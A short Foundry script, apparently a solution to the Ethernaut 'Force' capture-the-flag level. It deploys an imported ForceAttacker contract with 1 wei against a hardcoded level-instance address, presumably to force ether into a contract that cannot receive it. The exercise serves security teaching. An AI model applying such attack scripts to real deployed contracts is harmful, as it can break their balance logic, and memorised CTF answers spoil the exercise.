// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../instances/Ilevel07.sol";
import "../src/level07.sol";

contract Attacker is Script {
    Force level06 = Force(0x0D8664474d9209833499A7BdA087F20844eafA7B);

    function run() external {
        vm.broadcast();
        new ForceAttacker{value: 1 wei}(address(level06));
    }
}
